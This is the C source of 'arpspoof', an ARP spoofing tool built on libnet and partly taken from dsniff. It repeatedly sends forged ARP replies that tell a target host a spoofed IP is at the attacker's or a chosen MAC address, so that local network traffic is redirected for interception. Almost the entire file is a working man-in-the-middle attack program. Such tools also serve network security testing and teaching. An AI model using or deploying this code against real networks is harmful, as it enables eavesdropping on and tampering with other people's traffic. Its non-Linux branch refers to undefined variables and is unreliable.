/**
 * arpspoof.c
 *
 * Copyright (C) 2010 -  Wei-Ning Huang (AZ) <aitjcize@gmail.com>
 * All Rights reserved.
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software Foundation,
 * Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 *
 * *Note*
 * The function `arp_cache_lookup', `arp_force' and `get_mac_by_ip' is part
 * of the project `dsniff'.
 *
 */

#include <errno.h>
#include <getopt.h>
#include <libnet.h>
#include <net/if_arp.h>
#include <netinet/ether.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#define IP_ADDR_LEN 4

#define LOG_FATAL   0x1
#define LOG_LIBNET  0x2

extern int errno;

void usage(void);
void log_error(int level, const char *fmt, ...);
void build_packet(u_int8_t* src_mac, u_int8_t* src_ip,
    u_int8_t* dst_mac, u_int8_t* dst_ip);
void start_spoof(int send_interval, const char* intf, const char* ip,
    struct libnet_ether_addr* pmac);
int arp_cache_lookup(in_addr_t ip, struct libnet_ether_addr *mac);
int get_mac_by_ip(in_addr_t ip, struct libnet_ether_addr *mac);
int arp_force(in_addr_t dst);

const char* program_name = "arpspoof";
const char* program_version = "0.1";

static struct option longopts[] = {
  { "interface",  required_argument, NULL, 'i' },
  { "interval" ,  required_argument, NULL, 'n' },
  { "target",     required_argument, NULL, 't' },
  { "redirect",   required_argument, NULL, 'r' },
  { "help",       no_argument,       NULL, 'h' },
  { "version",    no_argument,       NULL, 'v' }
};

libnet_t* lnc = 0;

int main(int argc, char *argv[])
{
  char err_buf[LIBNET_ERRBUF_SIZE];
  int opt = 0;
  int send_interval = 1000000;           /* send interval in usecond */
  char* intf = NULL;                     /* interface */
  char* target_ip_str = NULL;            /* IP which packets is send to */
  char* spoof_ip_str = NULL;             /* IP we want to intercept packets */
  char* redirect_ip_str  = NULL;         /* IP of MAC we want to redirect 
                                            packets to, if not specified,
                                            attacker's MAC is used */
  in_addr_t tgt_ip = 0, red_ip = 0, spf_ip = 0;
  struct libnet_ether_addr tgt_mac, red_mac;

  while ((opt = getopt_long(argc, argv, "i:n:t:r:hv", longopts, NULL)) != -1) {
    switch(opt) {
      case 'i':
        intf = optarg;
        break;
      case 'n':
        send_interval = atoi(optarg);
        break;
      case 't':
        target_ip_str = optarg;
        break;
      case 'r':
        redirect_ip_str = optarg;
        break;
      case 'h':
        usage();
        exit(0);
      case 'v':
        printf("Version: %s\n", program_version);
        exit(0);
    }
  }

  if (!intf) {
    fprintf(stderr, "arpspoof: must specify interface\n");
    exit(1);
  }

  /* Initialize libnet context */
  lnc = libnet_init(LIBNET_LINK_ADV, intf, err_buf);

  /* If target not specified, set to broadcast */
  if (target_ip_str)
    tgt_ip = libnet_name2addr4(lnc, target_ip_str, LIBNET_RESOLVE);
  if (!tgt_ip)
    memcpy(tgt_mac.ether_addr_octet, "\xff\xff\xff\xff\xff\xff", 6);
  else if (!get_mac_by_ip(tgt_ip, &tgt_mac))
    log_error(LOG_FATAL | LOG_LIBNET, "can't find MAC address for %s\n",
              target_ip_str);

  /* If redirect IP not specified, packets are redirect to the attacker */
  if (redirect_ip_str)
    red_ip = libnet_name2addr4(lnc, redirect_ip_str, LIBNET_RESOLVE);
  if (!red_ip) {
    struct libnet_ether_addr* ptmp = libnet_get_hwaddr(lnc);
    if (ptmp == NULL)
      log_error(LOG_FATAL | LOG_LIBNET,
                "can't find MAC address for localhost\n");
    memcpy(red_mac.ether_addr_octet, ptmp->ether_addr_octet, 6);
  } else if (!get_mac_by_ip(red_ip, &red_mac))
    log_error(LOG_FATAL, "can't find MAC address for %s\n", target_ip_str);

  if (optind == argc)
    log_error(LOG_FATAL, "must specified host IP address\n");
  spoof_ip_str = argv[optind];
  spf_ip = libnet_name2addr4(lnc, spoof_ip_str, LIBNET_RESOLVE);

  build_packet((u_int8_t*)&red_mac, (u_int8_t*)&spf_ip,
               (u_int8_t*)&tgt_mac, (u_int8_t*)&tgt_ip);

  start_spoof(send_interval, intf, spoof_ip_str, &red_mac);
  return 0;
}

void build_packet(u_int8_t* src_mac, u_int8_t* src_ip,
    u_int8_t* dst_mac, u_int8_t* dst_ip) {

  libnet_ptag_t p_tag;

  p_tag = libnet_build_arp(      /* construct arp packet */
      ARPHRD_ETHER,              /* hardware type ethernet */
      ETHERTYPE_IP,              /* protocol type */
      ETHER_ADDR_LEN,            /* mac length */
      IP_ADDR_LEN,               /* protocol length */
      ARPOP_REPLY,               /* op type */
      src_mac,                   /* source mac addr */
      src_ip,                    /* source ip addr */
      dst_mac,                   /* dest mac addr */
      dst_ip,                    /* dest ip addr */
      NULL,                      /* payload */
      0,                         /* payload length */
      lnc,                       /* libnet context */
      0                          /* 0 stands to build a new one */
  );

  if(-1 == p_tag)
    log_error(LOG_FATAL, "can't build arp header\n");

  p_tag = libnet_build_ethernet( /* create ethernet header */
      dst_mac,                   /* dest mac addr */
      src_mac,                   /* source mac addr */
      ETHERTYPE_ARP,             /* protocol type */
      NULL,                      /* payload */
      0,                         /* payload length */
      lnc,                       /* libnet context */
      0                          /* 0 to build a new one */
  );

  if(-1 == p_tag)
    log_error(LOG_FATAL, "can't build ethernet header\n");
}

void start_spoof(int send_interval, const char* intf, const char* ip,
    struct libnet_ether_addr* pmac) {
  int size = 0;
  while (1) {
    if((size = libnet_write(lnc)) == -1) {
      log_error(LOG_LIBNET, "can't send packet\n");
    }
    printf("%s: sending %d bytes: %s is at %s\n", intf, size, ip,
        ether_ntoa((struct ether_addr*)pmac));
    usleep(send_interval);
  }
}

int arp_cache_lookup(in_addr_t ip, struct libnet_ether_addr *mac) {
  int sock = 0;
  struct arpreq ar;
  struct sockaddr_in *sin;

  memset((char*)&ar, 0, sizeof(ar));

#ifdef __linux__
  strncpy(ar.arp_dev, "eth0", sizeof(ar.arp_dev));
#endif

  sin = (struct sockaddr_in *)&ar.arp_pa;
  sin->sin_family = AF_INET;
  sin->sin_addr.s_addr = ip;

  if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
    return -1;
  if (ioctl(sock, SIOCGARP, (caddr_t)&ar) == -1) {
    close(sock);
    return -1;
  }
  close(sock);
  memcpy(mac->ether_addr_octet, ar.arp_ha.sa_data, ETHER_ADDR_LEN);
  return 0;
}

int get_mac_by_ip(in_addr_t ip, struct libnet_ether_addr *mac) {
  int i = 0;
  do {
    if (arp_cache_lookup(ip, mac) == 0)
      return 1;
#ifdef __linux__
    /* force the kernel to arp.*/
    arp_force(ip);
#else
    arp_send(llif, intf, ARPOP_REQUEST, NULL, 0, NULL, ip);
#endif
    sleep(1);
  }
  while (i++ < 3);
  return 0;
}

#ifdef __linux__
int arp_force(in_addr_t dst)
{
  struct sockaddr_in sin;
  int i, fd;

  if ((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
    return (0);

  memset(&sin, 0, sizeof(sin));
  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = dst;
  sin.sin_port = htons(67);

  i = sendto(fd, NULL, 0, 0, (struct sockaddr *)&sin, sizeof(sin));

  close(fd);

  return (i == 0);
}
#endif

void log_error(int level, const char *fmt, ...) {
  va_list vap;

  if ((level & LOG_LIBNET) == LOG_LIBNET) {
    char* tmp = libnet_geterror(lnc);
    if (tmp && strlen(tmp) != 0)
      fprintf(stderr, "%s: %s\n", program_name, tmp);
  }

  fprintf(stderr, "%s: ", program_name);
  va_start(vap, fmt);
  vfprintf(stderr, fmt, vap);
  va_end(vap);

  if ((level & LOG_FATAL) == LOG_FATAL)
    exit(1);
}

void usage(void) {
  fprintf(stderr, "Usage: %s [-i interface] [-t target IP] [-r redirect IP]"
                  " host\n", program_name);
}
